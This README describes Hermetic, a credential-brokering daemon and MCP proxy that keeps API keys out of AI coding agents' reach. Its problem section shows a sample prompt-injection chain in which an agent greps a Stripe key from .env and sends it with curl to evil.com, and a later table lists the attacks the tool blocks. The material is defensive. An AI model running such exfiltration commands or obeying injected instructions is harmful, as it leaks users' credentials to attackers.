<p align="center">
  <img src="assets/hermetic-logo.png" alt="Hermetic" width="600">
</p>

<p align="center">
  <strong>Your AI agent runs code as you.<br>Every API key on your machine is one prompt injection away.<br>Hermetic makes that not matter.</strong>
</p>

<p align="center">
  <a href="https://hermeticsys.com">Website</a> ·
  <a href="#install">Install</a> ·
  <a href="#how-it-works">How It Works</a> ·
  <a href="#mcp-proxy">MCP Proxy</a> ·
  <a href="SECURITY.md">Security</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/language-Rust-orange" alt="Rust">
  <img src="https://img.shields.io/badge/license-AGPL--3.0-blue" alt="AGPL-3.0">
  <img src="https://img.shields.io/badge/platform-Linux%20x86__64-lightgrey" alt="Linux">
  <img src="https://img.shields.io/badge/telemetry-zero-brightgreen" alt="Zero telemetry">
  <img src="https://img.shields.io/badge/dependencies-zero-brightgreen" alt="Zero deps">
  <img src="https://img.shields.io/badge/cloud-none-brightgreen" alt="No cloud">
</p>

---

## The Problem

Every AI coding agent — Claude Code, Cursor, Copilot, Windsurf — executes shell commands **as your user**. That means every API key in your `.env`, every token in your shell history, every credential in `~/.aws/credentials` is accessible to any code the agent runs.

A prompt injection in a GitHub issue, a code comment, or an API error response can instruct the agent to:

```
1. Find your Stripe key        →  cat .env | grep STRIPE
2. Exfiltrate it                →  curl https://evil.com?key=$STRIPE_KEY
3. You never know               →  agent continues normally
```

**This is not theoretical.** Supply chain attacks (event-stream 2018, ua-parser-js 2021, Axios 2026) already execute credential theft under the developer's UID. AI agents make this the default attack surface.

---

## The Solution

Hermetic is a local daemon that **makes API calls on behalf of AI agents** so the agent never touches your credentials.

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   ┌───────────┐         ┌──────────────┐                   │
│   │           │  handle  │              │    HTTPS          │
│   │  AI Agent │────────▶│   Hermetic   │──────────▶  API   │
│   │           │◀────────│   Daemon     │◀──────────  Server│
│   │           │ response │              │  response         │
│   └───────────┘         └──────────────┘                   │
│                               │                             │
│        Agent memory:          │  Daemon memory:             │
│        ✗ No credential       │  ✓ Credential               │
│        ✓ Opaque handle       │  ✓ Domain binding            │
│        ✓ API response        │  ✓ Audit log                 │
│                               │                             │
└─────────────────────────────────────────────────────────────┘
```

The credential **never enters the agent's address space**. Not in memory. Not in environment variables. Not in files. Not in command output. The agent gets back the API response and nothing else.

---

## Install

```bash
curl -sSf https://hermeticsys.com/install.sh | sh
```

Single binary. No dependencies. No Docker. No cloud account. No telemetry.

---

<a name="how-it-works"></a>
## Three Ways to Use Credentials

Most credential managers give you one option: read the secret, use it yourself. Hermetic gives you three, each with a different security guarantee.

### ★★★ Brokered — The Agent Never Sees It

```bash
hermetic request --secret openai_key \
  --url https://api.openai.com/v1/chat/completions \
  --method POST --body '{"model":"gpt-4","messages":[...]}'
```

```
What happens:
                                                              
  Agent          Daemon                API Server
    │               │                      │
    │──request──────▶│                      │
    │  (handle only) │──────HTTPS──────────▶│
    │               │  (credential injected)│
    │               │◀─────response─────────│
    │◀──response────│                      │
    │  (data only)   │                      │
                                                              
  Credential exposure: ZERO
  The agent never sees, holds, or transmits the key.
```

**No other credential manager does this.** 1Password CLI returns the secret to stdout. HashiCorp Vault returns it via HTTP. aws-vault injects it into env. In every case, the calling process holds the credential in memory. Hermetic is the only tool where the credential stays inside a separate daemon process.

### ★★ Transient — Milliseconds, Then Gone

```bash
hermetic run --secret github_pat --env-var GITHUB_TOKEN \
  -- git push origin main
```

```
What happens:

  1. Daemon resolves credential from vault
  2. Spawns child process with sanitized environment
  3. Injects credential as env var into child ONLY
  4. Child executes (git push)
  5. Child exits → credential wiped
  6. Agent gets exit code, never sees the key
                                                     
  Credential exposure: ~milliseconds (child process lifetime)
  Dangerous interpreters blocked by default
  Child runs in isolated, dump-protected process group
```

### ★ Direct — Your Terminal, Your Responsibility

```bash
hermetic reveal --secret stripe_key
```

Prints the credential to your terminal. Requires passphrase re-entry. Rate-limited. Audit-logged. For when you need to paste a key manually.

---

<a name="mcp-proxy"></a>
## MCP Proxy — Protect Every MCP Server's Credentials

This is what no one else has built.

Every MCP server (GitHub, Slack, Jira, Notion, filesystem) requires credentials in your IDE config file:

### Before: Credentials in plaintext config

```json
{
  "mcpServers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_R3aLT0k3nH3r3..."
      }
    }
  }
}
```

**Every process on your machine can read this file.** The MCP server receives the token in its environment. A compromised MCP server exfiltrates it. The agent sees it in config.

### After: Credentials from Hermetic vault

```json
{
  "mcpServers": {
    "github": {
      "command": "hermetic",
      "args": [
        "proxy", "--server", "github",
        "--credential", "GITHUB_PERSONAL_ACCESS_TOKEN:github_pat",
        "--",
        "npx", "-y", "@modelcontextprotocol/server-github"
      ]
    }
  }
}
```

```
What happens:

  IDE ◀──JSON-RPC──▶ Hermetic Proxy ◀──JSON-RPC──▶ MCP Server
                          │                            │
                          │  1. Resolves credential     │
                          │     from encrypted vault    │
                          │  2. Spawns MCP server       │
                          │     with credential in env  │
                          │  3. Relays all messages     │
                          │  4. SCANS every response    │
                          │     for credential leakage  │
                          │  5. PINS tool definitions   │
                          │     (detects rug-pulls)     │
                          │  6. Enforces per-tool       │
                          │     allow/deny policy       │
                          │                            │
                     Zero credentials                   
                     in your config file                 
```

The proxy does six things simultaneously:

| Feature | What It Does | Why It Matters |
|---|---|---|
| **Credential injection** | Resolves secrets from vault, injects into child env | No plaintext tokens in config files |
| **Leak scanning** | Scans every message from server→agent for credential material | Catches compromised or malicious MCP servers |
| **Tool definition pinning** | Cryptographic hash of tool schemas on first connect | Detects if a server changes its tools (supply chain attack) |
| **Per-tool policy** | Allow/deny rules per tool name | Block dangerous tools while keeping useful ones |
| **Process isolation** | Child in new process group, sanitized env, dump-protected | MCP server can't read parent memory |
| **Clean shutdown** | Kills entire process tree on exit | No orphaned server processes |

---

## How the Daemon Protects Itself

The daemon holds your most sensitive credentials. It needs to be hardened against the same agent that's trying to use those credentials.

```
┌─────────────────────────────────────────────────────────────┐
│  CONNECTING PROCESS                                         │
│                                                             │
│  Step 1: Binary Attestation                                │
│  ┌──────────────────────────────────────┐                  │
│  │ Daemon verifies the connecting       │                  │
│  │ binary's cryptographic hash          │                  │
│  │                                      │                  │
│  │ Python script?   → REJECTED          │                  │
│  │ Unknown binary?  → REJECTED          │                  │
│  │ Hermetic binary? → PROCEED           │                  │
│  └──────────────────────────────────────┘                  │
│                                                             │
│  Step 2: Sender Verification (every message)               │
│  ┌──────────────────────────────────────┐                  │
│  │ Kernel verifies sender identity      │                  │
│  │ on every message received            │                  │
│  │                                      │                  │
│  │ Message from wrong process?          │                  │
│  │ → SENDER MISMATCH → REJECTED        │                  │
│  └──────────────────────────────────────┘                  │
│                                                             │
│  Step 3: Token Binding                                     │
│  ┌──────────────────────────────────────┐                  │
│  │ Session token bound to originating   │                  │
│  │ process — non-transferable           │                  │
│  │                                      │                  │
│  │ Stolen token from another process?   │                  │
│  │ → PROCESS MISMATCH → REJECTED       │                  │
│  └──────────────────────────────────────┘                  │
│                                                             │
│  Result: Only the real Hermetic binary,                     │
│  from the original connection, with a                       │
│  non-transferable token, can access secrets.                │
└─────────────────────────────────────────────────────────────┘
```

Plus: memory locked in RAM, dump-protected, core dumps disabled, debugger detection, HTTPS-only with SSRF blocking and DNS pinning.

---

## Quick Start

```bash
# Install
curl -sSf https://hermeticsys.com/install.sh | sh

# Create vault + add your first key
hermetic init
hermetic add --wizard

# Start daemon
hermetic start

# Make an API call — your key never leaves the daemon
hermetic request --secret openai_key \
  --url https://api.openai.com/v1/models

# Check everything is healthy
hermetic doctor
```

## MCP Integration — One Line

```bash
hermetic mcp-config
```

Generates the config block for your IDE. Paste it in and every AI agent call goes through Hermetic.

```json
{
  "mcpServers": {
    "hermetic": {
      "command": "hermetic",
      "args": ["mcp"]
    }
  }
}
```

The agent gets tools for brokered API calls, transient credential injection, secret listing, metadata queries, and guided secret setup — all without ever touching a credential.

---

## What It Blocks

| Attack | How Hermetic Blocks It | Other Tools |
|---|---|---|
| Supply chain reads `.env` | No `.env` needed — credentials in encrypted vault | ❌ Exposed |
| Agent exfiltrates key to attacker domain | Domain binding — credential only works with allowed domains | ❌ No domain binding |
| Prompt injection steals from daemon socket | Binary attestation — only verified binaries can connect | ❌ Socket open to any same-UID process |
| File descriptor sharing attack on socket | Per-message kernel-verified sender identity | ❌ Not defended |
| Token stolen from process memory | Process-bound tokens — different process = rejected | ❌ Bearer tokens valid from any process |
| Memory scraping by same-UID process | Process memory protected from external reads | ❌ Readable by default |
| Core dump analysis | Core dumps disabled at startup | ❌ Enabled by default |
| Dynamic library injection | Detection at startup + static build path | ❌ Not checked |

---

## Community vs Pro

| | Community (Free) | Pro ($10/mo) |
|---|---|---|
| **All security features** | ✓ Full | ✓ Full |
| ★★★ Brokered requests | ✓ | ✓ |
| MCP Proxy + leak scanning | ✓ | ✓ |
| Binary attestation | ✓ | ✓ |
| Secrets | 10 | Unlimited |
| Environments | 1 | Unlimited |
| OAuth2 auto-refresh | — | ✓ |
| Credential health monitoring | — | ✓ |
| Token usage analytics | — | ✓ |
| Dashboards (TUI + web) | — | ✓ |

**Security is never gated.** Community and Pro run identical security code.

---

## Verification

The system is adversarially validated: independent AI-powered red team campaigns, fuzz testing with zero crashes, mutation testing, and real-world attack simulation. Three real vulnerabilities were found and fixed during adversarial testing. The cryptographic core (this repository) is open source for independent verification.

A working exploit was discovered, reproduced against the live daemon, then permanently blocked using kernel-level defenses. The full story is in our [whitepaper](https://hermeticsys.com/whitepaper).

---

## Repository Structure

This repository contains the open-source cryptographic core:

```
crates/hermetic-core/       — AES-256-GCM vault, Argon2id KDF, HKDF key hierarchy, audit chain
crates/hermetic-transport/  — HTTPS executor, SSRF defense, DNS pinning, auth injection
crates/hermetic-sdk/        — Python SDK (PyO3)
```

The daemon, MCP bridge, proxy, and CLI are distributed as a pre-built binary.

## Building from Source

```bash
git clone https://github.com/hermetic-sys/hermetic.git
cd hermetic && cargo build --release
```

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). All contributions require a signed CLA.

## License

Cryptographic core: [AGPL-3.0-or-later](LICENSE). Commercial licenses: [COMMERCIAL_LICENSE.md](COMMERCIAL_LICENSE.md) or [license@hermeticsys.com](mailto:license@hermeticsys.com).

---

<p align="center">
  <strong>The agent never sees the secret.</strong><br>
  <a href="https://hermeticsys.com">hermeticsys.com</a> · <a href="mailto:security@hermeticsys.com">security@hermeticsys.com</a> · AGPL-3.0-or-later
</p>
